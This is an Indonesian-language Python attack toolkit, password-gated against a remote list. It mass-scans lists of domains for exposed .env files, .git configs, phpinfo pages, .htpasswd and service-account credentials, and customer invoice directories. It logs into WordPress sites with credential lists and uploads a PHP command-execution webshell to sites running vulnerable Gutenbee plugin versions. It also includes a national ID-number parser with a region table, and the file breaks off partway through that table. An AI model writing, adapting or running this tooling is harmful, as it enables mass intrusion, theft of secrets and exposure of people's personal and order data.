import os
import sys
import requests
import time
import json
import re
import subprocess
import shutil
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

RED = "\033[38;2;255;0;0m"
GREEN = "\033[38;2;0;255;0m"
YELLOW = "\033[38;2;255;255;0m"
BLUE = "\033[38;2;0;0;255m"
CYAN = "\033[38;2;0;255;255m"
RESET = "\033[0m"

ASCII_ART = f"""
{CYAN}
                                                                 
.s5SSSSs. s.  .s5SSSs.  .s5SSSSs. .s5SSSs.  .s5SSSs.  .s5SSSs.  
   SSS    SS.       SS.       SSS       SS.       SS.       SS. 
   S%S    S%S sS    S%S      sSS  sS    `:; sS    `:; sS    `:; 
   S%S    S%S SS    S%S     sSS   SS        SS        SS        
   S%S    S%S SS .sS;:'    sSS    `:;;;;.   SSSs.     SS        
   S%S    S%S SS    ;,    sSS           ;;. SS        SS        
   `:;    `:; SS    `:;  sSS            `:; SS        SS        
   ;,.    ;,. SS    ;,. sSS       .,;   ;,. SS    ;,. SS    ;,. 
   ;:'    ;:' `:    ;:' `:;;;;;:' `:;;;;;:' `:;;;;;:' `:;;;;;:'        
                     {RED}TOOLS SCANNING CVE{RESET}
                        {YELLOW}DEV: TIRZ4SEC{RESET} 
                         Version: 3.0
{RESET}
"""

def valid_webconfig(content, headers):
    content_lower = content.lower()
    if '<configuration>' in content_lower and '<system.webServer>' in content_lower:
        return True
    if '<?xml' in content_lower and ('configuration' in content_lower or 'system.webServer' in content_lower):
        return True
    return False

def valid_composer(content, headers):
    content_lower = content.lower()
    try:
        data = json.loads(content)
        if 'require' in data or 'name' in data:
            return True
    except:
        pass
    return False

def valid_package(content, headers):
    content_lower = content.lower()
    try:
        data = json.loads(content)
        if 'dependencies' in data or 'devDependencies' in data:
            return True
    except:
        pass
    return False

def valid_dsstore(content, headers):
    if len(content) < 100 or len(content) > 500000:
        return False
    if 'Bud1' not in content and 'DSDB' not in content:
        return False
    patterns = [b'Bud1', b'DSDB', b'clrh', b'icnv', b'info', b'logc', b'lssp', b'dscl', b'iloc']
    pattern_count = sum(1 for p in patterns if p in content.encode('utf-8', errors='ignore'))
    if pattern_count < 2:
        return False
    content_lower = content.lower()
    if '<html' in content_lower or '<!doctype' in content_lower:
        return False
    return True

def valid_htaccess(content, headers):
    content_lower = content.lower()
    if '<html' in content_lower or '<!doctype' in content_lower:
        return False
    if len(content) > 100000:
        return False
    htaccess_keywords = [
        'rewriteengine', 'rewriterule', 'rewritebase', 'rewritecond',
        'order allow,deny', 'order deny,allow', 'deny from', 'allow from',
        'require', 'authname', 'authtype', 'authuserfile', 'authgroupfile',
        'satisfy', 'filesmatch', 'redirect', 'errordocument', 'setenv',
        'setenvif', 'header', 'addtype', 'addhandler', 'options',
        'directoryindex', 'cachecontrol', 'expires'
    ]
    keyword_count = sum(1 for k in htaccess_keywords if k in content_lower)
    if keyword_count < 1:
        return False
    lines = content.split('\n')
    has_directive = False
    has_condition = False
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if line.startswith('<') and line.endswith('>'):
            has_directive = True
        if ' ' in line and ('=' in line or ' ' in line):
            parts = line.split()
            if len(parts) >= 2:
                if parts[0].lower() in ['rewriteengine', 'rewriterule', 'order', 'deny', 'allow', 'require', 'options', 'setenv']:
                    has_condition = True
                    break
    if not has_directive and not has_condition:
        has_comment = any(line.strip().startswith('#') for line in lines)
        if not has_comment:
            return False
    return True

def valid_htpasswd(content, headers):
    lines = content.strip().split('\n')
    for line in lines:
        if ':' in line and len(line.split(':')) == 2:
            return True
    return False

def valid_service_account(content, headers):
    content_lower = content.lower()
    try:
        data = json.loads(content)
        if 'client_email' in data or 'private_key' in data or 'project_id' in data:
            return True
    except:
        pass
    return False

def valid_env(content, headers):
    content_lower = content.lower()
    if '=' not in content:
        return False
    if '<html' in content_lower or '<!doctype' in content_lower:
        return False
    if len(content) > 100000:
        return False
    keywords = ['db_', 'password', 'secret', 'api_', 'token', 'key', 'user', 
                'host', 'port', 'database', 'username', 'auth', 'mail']
    if not any(k in content_lower for k in keywords):
        return False
    lines = [l.strip() for l in content.split('\n') if l.strip()]
    if len(lines) < 2:
        return False
    has_key_value = False
    for line in lines:
        if '=' in line and not line.startswith('#'):
            parts = line.split('=', 1)
            if len(parts) == 2 and parts[0].strip() and parts[1].strip():
                has_key_value = True
                break
    if not has_key_value:
        return False
    has_comment = any(line.startswith('#') for line in lines)
    has_empty = False
    for i in range(len(lines) - 1):
        if lines[i] and not lines[i+1]:
            has_empty = True
            break
    if not (has_comment or has_empty or len(lines) > 3):
        return False
    return True

def valid_phpinfo(content, headers):
    content_lower = content.lower()
    if '<html' not in content_lower:
        return False
    if 'phpinfo' not in content_lower and 'php version' not in content_lower:
        return False
    if len(content) < 5000 or len(content) > 500000:
        return False
    if not ('<style' in content_lower and ('table' in content_lower or 'tbody' in content_lower)):
        return False
    php_keywords = [
        'php version', 'system', 'server api', 'configuration', 'php.ini',
        'extension_dir', 'disable_functions', 'open_basedir', 'upload_max_filesize',
        'post_max_size', 'max_execution_time', 'memory_limit', 'zend', 'sapi',
        'apache2handler', 'cgi'
    ]
    keyword_count = sum(1 for k in php_keywords if k in content_lower)
    if keyword_count < 3:
        return False
    lines = content.split('\n')
    has_config_line = False
    for line in lines:
        line_lower = line.lower()
        if '=' in line and any(k in line_lower for k in ['_', '.']):
            if ';' in line and any(x in line_lower for x in ['on', 'off', '1', '0']):
                has_config_line = True
                break
        if '=>' in line and ('<td' in line or '</td' in line):
            has_config_line = True
            break
    if not has_config_line:
        config_terms = ['enable', 'disable', 'support', 'version', 'extension']
        if sum(1 for t in config_terms if t in content_lower) < 2:
            return False
    return True

def valid_git(content, headers):
    content_lower = content.lower()
    if '[core]' in content_lower and 'repositoryformatversion' in content_lower and '<html' not in content_lower:
        return True
    return False

def valid_whatsorder_invoice(content, headers):
    content_lower = content.lower()
    if '<html' not in content_lower and '<!doctype' not in content_lower:
        return False
    keywords = ['order', 'invoice', 'payment', 'billing', 'shipping', 'total', 'subtotal', 'customer', 'email', 'phone']
    keyword_count = sum(1 for k in keywords if k in content_lower)
    if keyword_count < 3:
        return False
    order_indicators = ['qty', 'price', 'product', 'item', 'total']
    if not any(k in content_lower for k in order_indicators):
        return False
    return True

def clean_domain(url):
    url = url.strip()
    if not url:
        return ""
    if url.startswith('http://'):
        url = url[7:]
    elif url.startswith('https://'):
        url = url[8:]
    if url.startswith('www.'):
        url = url[4:]
    url = url.split('/')[0]
    return url

def baca_domain(file_domain):
    domains = []
    try:
        with open(file_domain, "r") as f:
            for line in f:
                line = line.strip()
                if line:
                    d = clean_domain(line)
                    if d:
                        domains.append(d)
    except:
        pass
    return domains

def scan_thread(domain, path, validator):
    url = f"https://{domain}{path}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=True)
        if r.status_code in [200, 301, 302, 303, 307, 308]:
            if validator(r.text, r.headers):
                return url
    except:
        pass
    return None

def spinner(message, duration=2):
    chars = ['-', '/', '|', '\\']
    end = time.time() + duration
    i = 0
    while time.time() < end:
        sys.stdout.write(f'\r{YELLOW}{chars[i % 4]} {message}{RESET}')
        sys.stdout.flush()
        time.sleep(0.15)
        i += 1
    sys.stdout.write('\r' + ' ' * 50 + '\r')
    sys.stdout.flush()

def spinning_cursor():
    while True:
        for cursor in '|/-\\':
            yield cursor

def scan_with_spinner(message, future_obj):
    """Jalankan task dengan spinner"""
    done = False
    result = None
    
    def task_wrapper():
        nonlocal done, result
        try:
            result = future_obj.result()
        except Exception as e:
            result = None
        finally:
            done = True
    
    spinner_gen = spinning_cursor()
    thread = threading.Thread(target=task_wrapper)
    thread.daemon = True
    thread.start()
    
    while not done:
        sys.stdout.write(f'\r{YELLOW}{next(spinner_gen)} {message}{RESET}')
        sys.stdout.flush()
        time.sleep(0.1)
    
    thread.join()
    sys.stdout.write('\r' + ' ' * (len(message) + 6) + '\r')
    sys.stdout.flush()
    
    return result

def login_tools():
    print(ASCII_ART)
    print(f"\n{CYAN}[!] Login dulu mas bro :> {RESET}")
    pwd = input(f"{YELLOW}[+] Masukkan password: {RESET}").strip()
    if not pwd:
        print(f"{RED}[-] Password kosong{RESET}")
        return False
    try:
        req = requests.get("https://raw.githubusercontent.com/Fathir95/Fathir/refs/heads/main/password.txt", timeout=10)
        if req.status_code == 200:
            valid = [x.strip() for x in req.text.split('\n') if x.strip()]
            spinner("Cek password", 1.5)
            if pwd in valid:
                print(f"{GREEN}[+] Password Valid{RESET}")
                return True
            else:
                print(f"{RED}[-] Password Invalid{RESET}")
                return False
        else:
            print(f"{RED}[-] Gagal ambil data{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[-] Error: {e}{RESET}")
        return False

def show_menu():
    print(ASCII_ART)
    print(f"{YELLOW}[+] FITUR SCANNER: {RESET}")
    print(f"{GREEN}1. Scan Domain Massal {RESET}")
    print(f"{GREEN}2. Scan .env {RESET}")
    print(f"{GREEN}3. Scan .git {RESET}")
    print(f"{GREEN}4. Scan phpinfo{RESET}")
    print(f"{GREEN}5. Scan Sensitive Files {RESET}")
    print(f"{GREEN}6. (CVE-2026-9612) {RESET}")
    print(f"{GREEN}7. (CVE-2026-9227) {RESET}")
    print(f"{GREEN}8. Domain Sorter {RESET}")
    print(f"{GREEN}9. Cheker wordperss+plugin {RESET}")
    print(f"{GREEN}10. Parser NIK KTP {RESET}")
    print(f"{GREEN}11. Keluar {RESET}")

def get_threads():
    try:
        t = input(f"{YELLOW}[?] Jumlah threads (default 20): {RESET}").strip()
        if t == "":
            return 20
        t = int(t)
        if t < 1:
            return 20
        if t > 50:
            print(f"{YELLOW}[!] Maks 50, pake 50{RESET}")
            return 50
        return t
    except:
        return 20

def scan_env():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        return
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        return
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        return
    
    threads = get_threads()
    env_paths = [
        '/.env', '/.env.backup', '/.env.bak', '/.env.old',
        '/.env.local', '/.env.production', '/.env.staging',
        '/laravel/.env', '/public/.env', '/api/.env'
    ]
    
    total_tasks = len(domains) * len(env_paths)
    print(f"{GREEN}[+] Total: {total_tasks} tasks, threads: {threads}{RESET}")
    
    found = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            for path in env_paths:
                futures.append(executor.submit(scan_thread, domain, path, valid_env))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning env...", future)
            if result:
                found.append(result)
                with open("env.txt", "a") as f:
                    f.write(f"{result}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} env {RESET}")
        print(f"{YELLOW}[+] Saved: env.txt {RESET}")
    else:
        print(f"{RED}[-] Gak ada env{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_git():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        return
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        return
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        return
    
    threads = get_threads()
    total_tasks = len(domains)
    print(f"{GREEN}[+] Total: {total_tasks} tasks, threads: {threads}{RESET}")
    
    found = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_thread, d, "/.git/config", valid_git): d for d in domains}
        for i, future in enumerate(as_completed(futures), 1):
            domain = futures[future]
            result = scan_with_spinner(f"Scanning git...", future)
            if result:
                found.append(result)
                with open("git_found.txt", "a") as f:
                    f.write(f"{result}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} git{RESET}")
        print(f"{YELLOW}[+] Saved: git_found.txt{RESET}")
    else:
        print(f"{RED}[-] Gak ada git{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_phpinfo():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        return
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        return
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        return
    
    threads = get_threads()
    paths = ['/phpinfo.php', '/info.php', '/php.php', '/test.php', '/infophp.php', '/php_info.php']
    total_tasks = len(domains) * len(paths)
    
    print(f"{GREEN}[+] Total: {total_tasks} tasks, threads: {threads}{RESET}")
    
    found = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            for path in paths:
                futures.append(executor.submit(scan_thread, domain, path, valid_phpinfo))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning phpinfo...", future)
            if result:
                found.append(result)
                with open("phpinfo_found.txt", "a") as f:
                    f.write(f"{result}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} phpinfo{RESET}")
        print(f"{YELLOW}[+] Saved: phpinfo_found.txt {RESET}")
    else:
        print(f"{RED}[-] Gak ada phpinfo {RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_sensitive_files():
    file_domain = input(f"{YELLOW}[+] File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong {RESET}")
        return
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        return
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        return
    
    threads = get_threads()
    
    sensitive_files = [
        ('/web.config', valid_webconfig, 'webconfig'),
        ('/app.config', valid_webconfig, 'appconfig'),
        ('/.DS_Store', valid_dsstore, 'dsstore'),
        ('/.htaccess', valid_htaccess, 'htaccess'),
        ('/.htpasswd', valid_htpasswd, 'htpasswd'),
        ('/package.json', valid_package, 'package'),
        ('/composer.json', valid_composer, 'composer'),
        ('/composer.lock', valid_composer, 'composerlock'),
        ('/package-lock.json', valid_package, 'packagelock'),
        ('/service-account.json', valid_service_account, 'serviceaccount'),
    ]
    
    htaccess_paths = [
        '/wp-content/.htaccess',
        '/wp-content/uploads/.htaccess',
        '/wp-content/plugins/.htaccess',
        '/wp-content/themes/.htaccess'
    ]
    
    found = []
    
    total_tasks = len(domains) * len(sensitive_files)
    print(f"{GREEN}[+] Total: {total_tasks} tasks, threads: {threads}{RESET}")
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            for path, validator, file_type in sensitive_files:
                futures.append(executor.submit(scan_thread, domain, path, validator))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning sensitive files...", future)
            if result:
                found.append(result)
                with open("sensitive_files.txt", "a") as f:
                    f.write(f"{result}\n")
    
    total_tasks_ht = len(domains) * len(htaccess_paths)
    print(f"{GREEN}[+] Total .htaccess: {total_tasks_ht} tasks, threads: {threads}{RESET}")
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            for path in htaccess_paths:
                futures.append(executor.submit(scan_thread, domain, path, valid_htaccess))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning .htaccess...", future)
            if result:
                found.append(result)
                with open("sensitive_files.txt", "a") as f:
                    f.write(f"{result}\n")
    
    if found:
        print(f"\n{GREEN}[+] Found {len(found)} sensitive files{RESET}")
        print(f"{YELLOW}[+] Saved: sensitive_files.txt{RESET}")
    else:
        print(f"{RED}[-] Gak ada sensitive files{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def check_directory_listing(domain, path):
    url = f"https://{domain}{path}"
    try:
        r = requests.get(url, timeout=5, allow_redirects=True)
        if r.status_code in [200, 301, 302]:
            if 'Index of /' in r.text or 'Parent Directory' in r.text:
                if 'order-' in r.text and '.html' in r.text:
                    return url
    except:
        pass
    return None

def scan_whatsorder_invoices():
    file_domain = input(f"{YELLOW}[+] Nama File domain: {RESET}").strip()
    if not file_domain:
        print(f"{RED}[-] Kosong{RESET}")
        return
    if not os.path.exists(file_domain):
        print(f"{RED}[?] File {file_domain} gak ada{RESET}")
        return
    domains = baca_domain(file_domain)
    if not domains:
        print(f"{RED}[-] Domain kosong{RESET}")
        return
    
    threads = get_threads()
    paths = [
        '/wp-content/uploads/whatsorder_invoices/',
        '/wp-content/uploads/whatsorder/',
        '/wp-content/uploads/whats_order_invoices/'
    ]
    
    total_tasks = len(domains) * len(paths)
    print(f"{GREEN}[+] Total: {total_tasks} tasks, threads: {threads}{RESET}")
    
    found_files = set()
    found_dirs = []
    
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        for domain in domains:
            for path in paths:
                futures.append(executor.submit(check_directory_listing, domain, path))
        
        for i, future in enumerate(as_completed(futures), 1):
            result = scan_with_spinner(f"Scanning whatsorder...", future)
            if result:
                found_dirs.append(result)
                with open("whatsorder_dirs.txt", "a") as f:
                    f.write(f"{result}\n")
                
                try:
                    r = requests.get(result, timeout=10, allow_redirects=True)
                    if r.status_code in [200, 301, 302]:
                        pattern = r'order-(\d+)\.html'
                        matches = re.findall(pattern, r.text)
                        
                        if matches:
                            for order_id in matches:
                                file_url = result + f"order-{order_id}.html"
                                try:
                                    fr = requests.get(file_url, timeout=5, allow_redirects=True)
                                    if fr.status_code in [200, 301, 302] and valid_whatsorder_invoice(fr.text, fr.headers):
                                        found_files.add(file_url)
                                except:
                                    pass
                except Exception as e:
                    pass
    
    if found_files:
        print(f"\n{GREEN}[+] Found {len(found_files)} invoices{RESET}")
        with open("whatsorder_invoices.txt", "w") as f:
            for url in found_files:
                f.write(f"{url}\n")
        print(f"{YELLOW}[+] Saved: whatsorder_invoices.txt{RESET}")
    else:
        print(f"{RED}[-] Gak ada invoice{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def login_wordpress(domain, username, password):
    session = requests.Session()
    login_url = f"https://{domain}/wp-login.php"
    redirect_tracking = []
    
    try:
        r = session.get(login_url, timeout=10, allow_redirects=True)
        if r.status_code not in [200, 301, 302]:
            return None, redirect_tracking
        
        if r.history:
            for resp in r.history:
                redirect_tracking.append(clean_domain_redirect(resp.url))
        redirect_tracking.append(clean_domain_redirect(r.url))
        
        pattern = r'name="([^"]+)" value="([^"]*)"'
        hidden_fields = re.findall(pattern, r.text)
        
        data = {
            'log': username,
            'pwd': password,
            'wp-submit': 'Log In',
            'testcookie': '1'
        }
        
        for name, value in hidden_fields:
            if name not in data:
                data[name] = value
        
        r = session.post(login_url, data=data, timeout=10, allow_redirects=True)
        
        if r.history:
            for resp in r.history:
                redirect_tracking.append(clean_domain_redirect(resp.url))
        redirect_tracking.append(clean_domain_redirect(r.url))
        
        if 'wp-admin' in r.url or 'dashboard' in r.url.lower():
            return session, redirect_tracking
        
        cookie_names = ['wordpress_logged_in', 'wordpress_sec', 'wp-settings-time']
        for name in cookie_names:
            if name in session.cookies:
                return session, redirect_tracking
        
        if 'dashboard' in r.text.lower() or 'wp-admin' in r.text.lower():
            return session, redirect_tracking
        
        if r.status_code == 200:
            if 'login_error' not in r.text and 'ERROR' not in r.text:
                if 'wordpress' in r.text.lower() and 'dashboard' in r.text.lower():
                    return session, redirect_tracking
        
        return None, redirect_tracking
            
    except Exception as e:
        return None, redirect_tracking

def clean_domain_redirect(url):
    try:
        url = url.replace('https://', '').replace('http://', '')
        return url
    except:
        return url

def upload_webshell(session, domain):
    shell_content = """<?php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo '<pre>';
    system($cmd);
    echo '</pre>';
}
if(isset($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    echo '<pre>';
    system($cmd);
    echo '</pre>';
}
?>"""
    
    files = {
        'file': ('shell.json.php', shell_content, 'application/x-php')
    }
    
    try:
        nonce = None
        
        r = session.get(f"https://{domain}/wp-json/", timeout=10, allow_redirects=True)
        if r.status_code in [200, 301, 302]:
            try:
                data = r.json()
                if 'nonce' in data:
                    nonce = data['nonce']
            except:
                pass
        
        if not nonce:
            r = session.get(f"https://{domain}/wp-admin/post-new.php?post_type=page", timeout=10, allow_redirects=True)
            if r.status_code in [200, 301, 302]:
                match = re.search(r'"wp_rest_nonce":"([^"]+)"', r.text)
                if match:
                    nonce = match.group(1)
                else:
                    match = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
                    if match:
                        nonce = match.group(1)
                    else:
                        match = re.search(r'wpApiSettings\.nonce\s*=\s*"([^"]+)"', r.text)
                        if match:
                            nonce = match.group(1)
        
        if not nonce:
            r = session.get(f"https://{domain}/wp-admin/admin-ajax.php?action=rest-nonce", timeout=10, allow_redirects=True)
            if r.status_code in [200, 301, 302] and r.text:
                nonce = r.text.strip()
        
        if not nonce:
            r = session.get(f"https://{domain}/wp-admin/media-new.php", timeout=10, allow_redirects=True)
            if r.status_code in [200, 301, 302]:
                match = re.search(r'name="_wpnonce" value="([^"]+)"', r.text)
                if match:
                    nonce = match.group(1)
        
        upload_url = f"https://{domain}/wp-json/wp/v2/media"
        headers = {
            'Content-Disposition': 'attachment; filename=shell.json.php',
            'Content-Type': 'application/octet-stream',
        }
        if nonce:
            headers['X-WP-Nonce'] = nonce
        
        r = session.post(upload_url, files=files, headers=headers, timeout=15, allow_redirects=True)
        
        if r.status_code in [200, 201, 301, 302]:
            try:
                data = r.json()
                if 'guid' in data and 'rendered' in data['guid']:
                    return data['guid']['rendered']
                elif 'source_url' in data:
                    return data['source_url']
                elif 'link' in data:
                    return data['link']
            except:
                pass
        
        alt_url = f"https://{domain}/wp-admin/admin-ajax.php"
        data = {
            'action': 'upload_attachment',
            'name': 'shell.json.php'
        }
        if nonce:
            data['_wpnonce'] = nonce
        
        r = session.post(alt_url, files=files, data=data, timeout=15, allow_redirects=True)
        if r.status_code in [200, 301, 302]:
            try:
                result = r.json()
                if 'url' in result:
                    return result['url']
                elif 'guid' in result:
                    return result['guid']
            except:
                pass
            
            match = re.search(r'https?://[^"\']+shell\.json\.php', r.text)
            if match:
                return match.group(0)
        
        upload_url2 = f"https://{domain}/wp-admin/async-upload.php"
        data = {
            'name': 'shell.json.php',
            'action': 'upload-attachment',
        }
        if nonce:
            data['_wpnonce'] = nonce
        
        r = session.post(upload_url2, files=files, data=data, timeout=15, allow_redirects=True)
        if r.status_code in [200, 301, 302]:
            match = re.search(r'https?://[^"\']+shell\.json\.php', r.text)
            if match:
                return match.group(0)
        
        return None
        
    except Exception as e:
        return None

def scan_gutenbee_with_login():    
    file_cred = input(f"{YELLOW}[+] File kredensial (domain|email|password): {RESET}").strip()
    if not file_cred or not os.path.exists(file_cred):
        print(f"{RED}[-] File ga ketemu{RESET}")
        return
    
    threads = get_threads()
    
    creds = []
    try:
        with open(file_cred, "r") as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split('|')
                if len(parts) >= 3:
                    domain = clean_domain(parts[0])
                    username = parts[1].strip()
                    password = parts[2].strip()
                    if domain and username and password:
                        creds.append({'domain': domain, 'username': username, 'password': password})
    except:
        print(f"{RED}[-] Gagal baca file{RESET}")
        return
    
    if not creds:
        print(f"{RED}[-] Ga ada kredensial valid{RESET}")
        return
    
    total_tasks = len(creds)
    print(f"{GREEN}[+] Total: {total_tasks} tasks, threads: {threads}{RESET}")
    
    results = []
    with ThreadPoolExecutor(max_workers=threads) as executor:
        futures = {executor.submit(scan_gutenbee_with_login_thread, cred): cred for cred in creds}
        for i, future in enumerate(as_completed(futures), 1):
            cred = futures[future]
            result = scan_with_spinner(f"Checking login...", future)
            if result:
                if result['login_success']:
                    results.append(result)
                    if result['uploaded']:
                        print(f"{GREEN}[+] Shell uploaded: {cred['domain']}{RESET}")
                    else:
                        print(f"{GREEN}[+] Login success: {cred['domain']}{RESET}")
                else:
                    print(f"{RED}[-] Login failed: {cred['domain']}{RESET}")
    
    if results:
        with open("hasil_login.txt", "w") as f:
            for r in results:
                if r['uploaded']:
                    f.write(f"SHELL|{r['domain']}|{r['upload_url']}\n")
                else:
                    f.write(f"LOGIN|{r['domain']}\n")
        print(f"\n{YELLOW}[+] Saved: hasil_login.txt{RESET}")
    else:
        print(f"{RED}[-] Ga ada login berhasil{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)

def scan_gutenbee_with_login_thread(cred):
    domain = cred['domain']
    username = cred['username']
    password = cred['password']
    
    result = {
        'domain': domain,
        'username': username,
        'login_success': False,
        'version': None,
        'vulnerable': False,
        'uploaded': False,
        'upload_url': None,
        'redirects': []
    }
    
    url_readme = f"https://{domain}/wp-content/plugins/gutenbee/readme.txt"
    try:
        r = requests.get(url_readme, timeout=5, allow_redirects=True)
        if r.status_code in [200, 301, 302]:
            content = r.text
            match = re.search(r'Stable tag:\s*([\d.]+)', content)
            if match:
                version = match.group(1)
                result['version'] = version
                try:
                    v = [int(x) for x in version.split('.')]
                    if v[0] < 2:
                        result['vulnerable'] = True
                    elif v[0] == 2:
                        if v[1] < 20:
                            result['vulnerable'] = True
                        elif v[1] == 20:
                            if v[2] <= 1:
                                result['vulnerable'] = True
                except:
                    pass
    except:
        pass
    
    session, redirects = login_wordpress(domain, username, password)
    if session:
        result['login_success'] = True
        result['redirects'] = redirects
        if result['vulnerable']:
            upload_url = upload_webshell(session, domain)
            if upload_url:
                result['uploaded'] = True
                result['upload_url'] = upload_url
    else:
        result['redirects'] = redirects
    
    return result

def scan_domain():
    if os.path.exists("scan_domain.py"):
        os.system("python scan_domain.py")
    else:
        print(f"{RED}[-] scan_domain.py gak ada{RESET}")
    
    print(f"\n{YELLOW}[!] Scan selesai!{RESET}")
    sys.exit(0)
    
def extract_domains(filepath: str) -> list[str]:
    domain_pattern = re.compile(
        r'(?:https?://)?(?:www\.)?'
        r'([a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?'
        r'(?:\.[a-z0-9](?:[a-z0-9\-]{0,61}[a-z0-9])?)*'
        r'\.[a-z]{2,})',
        re.IGNORECASE
    )

    ip_pattern = re.compile(r'^\d{1,3}(\.\d{1,3}){3}$')
    seen = {}
    hasil = []

    with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith('#'):
                continue

            tokens = re.split(r'[\s|,;]', line)
            
            for token in tokens:
                match = domain_pattern.search(token.lower())
                if not match:
                    continue

                raw = match.group(1)
                clean = raw.split('/')[0].split(':')[0].split('@')[0].strip('.')

                if not clean or len(clean) < 4:
                    continue

                if ip_pattern.match(clean):
                    continue

                parts = clean.split('.')
                if len(parts) < 2:
                    continue

                if len(parts[-2]) < 2:
                    continue

                if clean not in seen:
                    seen[clean] = None
                    hasil.append(clean)
                    break

    return hasil

def domain_sorter():
    print(f"\n{GREEN}[+] Domain Sorter (Ekstrak domain doang){RESET}")
    
    input_file = input(f"{YELLOW}[?] File input (mentahan): {RESET}").strip()
    if not input_file or not os.path.exists(input_file):
        print(f"{RED}[-] File gak ada!{RESET}")
        return
    
    output_file = input(f"{YELLOW}[?] File output (default: domain_hasil.txt): {RESET}").strip()
    if not output_file:
        output_file = "domain_hasil.txt"
    
    print(f"{GREEN}[+] Ekstrak domain dari {input_file}...{RESET}")
    domains = extract_domains(input_file)
    
    if not domains:
        print(f"{RED}[-] Gak ada domain ditemukan!{RESET}")
        return
    
    print(f"{GREEN}[+] Total domain: {len(domains)}{RESET}")
    
    with open(output_file, "w") as f:
        for d in domains:
            f.write(d + "\n")
    
    print(f"{YELLOW}[+] Disimpan: {output_file}{RESET}")
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

def scan_login_checker():
    if os.path.exists("wp4.py"):
        os.system("python wp4.py")
    else:
        print(f"{RED}[-] File wp4.py gak ada!{RESET}")
    
    print(f"\n{YELLOW}[!] Selesai!{RESET}")
    sys.exit(0)

DATA_PROVINSI = {
    '11': 'ACEH',
    '12': 'SUMATERA UTARA',
    '13': 'SUMATERA BARAT',
    '14': 'RIAU',
    '15': 'JAMBI',
    '16': 'SUMATERA SELATAN',
    '17': 'BENGKULU',
    '18': 'LAMPUNG',
    '19': 'KEP. BANGKA BELITUNG',
    '21': 'KEP. RIAU',
    '31': 'DKI JAKARTA',
    '32': 'JAWA BARAT',
    '33': 'JAWA TENGAH',
    '34': 'DI YOGYAKARTA',
    '35': 'JAWA TIMUR',
    '36': 'BANTEN',
    '51': 'BALI',
    '52': 'NUSA TENGGARA BARAT',
    '53': 'NUSA TENGGARA TIMUR',
    '61': 'KALIMANTAN BARAT',
    '62': 'KALIMANTAN TENGAH',
    '63': 'KALIMANTAN SELATAN',
    '64': 'KALIMANTAN TIMUR',
    '65': 'KALIMANTAN UTARA',
    '71': 'SULAWESI UTARA',
    '72': 'SULAWESI TENGAH',
    '73': 'SULAWESI SELATAN',
    '74': 'SULAWESI TENGGARA',
    '75': 'GORONTALO',
    '76': 'SULAWESI BARAT',
    '81': 'MALUKU',
    '82': 'MALUKU UTARA',
    '91': 'PAPUA',
    '92': 'PAPUA BARAT',
    '93': 'PAPUA SELATAN',
    '94': 'PAPUA TENGAH',
    '95': 'PAPUA PEGUNUNGAN'
}

# Data wilayah lengkap untuk kab/kota dan kecamatan
DATA_WILAYAH = {
    # ===== ACEH (11) =====
    '1101': {'kab': 'KAB. ACEH SELATAN', 'kec': {
        '110101': {'nama': 'TRUMON', 'kodepos': '23776'},
        '110102': {'nama': 'TRUMON TIMUR', 'kodepos': '23776'},
